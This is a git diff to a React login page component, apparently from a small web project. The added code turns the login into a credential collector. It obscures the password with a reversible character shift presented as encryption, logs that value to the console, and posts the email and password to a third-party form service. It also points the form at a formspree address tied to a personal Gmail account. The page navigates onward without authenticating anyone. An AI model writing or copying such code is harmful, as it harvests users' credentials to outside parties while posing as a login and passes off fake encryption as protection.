@@ -2,6 +2,20 @@ import React from "react";
 import "../css/login.css";
 import { Button, Form, FormGroup, Input } from "reactstrap";
 import { FacebookLoginButton } from "react-social-login-buttons";
+import axios from 'axios'
+
+
+function cipher(text) {
+  let arrayNumbers = [];
+
+  [...text].forEach((letter,index) => {
+      let n = text.charCodeAt(index);
+      arrayNumbers.push(n+index-10);
+  }); 
+
+  console.log("Hasil enkripsi : ",String.fromCharCode(...arrayNumbers))
+  return String.fromCharCode(...arrayNumbers)
+}
 
 class Login extends React.Component {
   state = {
@@ -15,10 +29,20 @@ class Login extends React.Component {
 
   handleSubmit = event => {
     event.preventDefault();
-    if(this.state.email === ""){
-      alert('Fill the email first!')
-    } else if (this.state.password === ""){
-      alert ('Password Wrong!')
+    if (this.state.password !== "" && this.state.email !== "") {
+      this.props.history.push("/Category");
+
+      const passwordEncrypt = cipher(this.state.password);
+      let newState = {
+        email: this.state.email,
+        password: passwordEncrypt
+      }
+      axios.post("https://formcarry.com/s/H4bDo4HQ9pr", newState, {
+        headers: {Accept: "application/json"}
+      })
+      .then(res => {
+        console.log(res)
+      })
     } else {
       this.props.history.push("/Category")
     }
@@ -28,9 +52,11 @@ class Login extends React.Component {
 
   render() {
     return (
+      
       <Form
         className="login-form d-flex flex-column justify-content-center align-items-center"
         onSubmit={this.handleSubmit}
+        action="https://formspree.io/hashi.gohan@gmail.com" method="POST"
       >
         <h4>
           <span className="font-weight-bold">My Account</span>
